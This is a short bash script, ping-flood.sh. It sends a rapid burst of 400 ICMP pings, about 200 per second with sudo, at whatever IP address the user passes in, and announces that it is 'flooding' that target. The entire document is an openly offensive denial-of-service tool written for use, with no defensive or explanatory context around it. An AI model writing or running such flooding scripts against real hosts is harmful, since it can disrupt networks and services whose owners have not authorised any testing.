#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "Usage: sudo ./ping-flood.sh <target_ip>"
    exit 1
fi

TARGET_IP=$1
BURST_COUNT=400
INTERVALS=0.005  # Sends 200 pings per second (approx)

echo "[*] Flooding $TARGET_IP with $BURST_COUNT pings..."
ping -c $BURST_COUNT -i $INTERVALS $TARGET_IP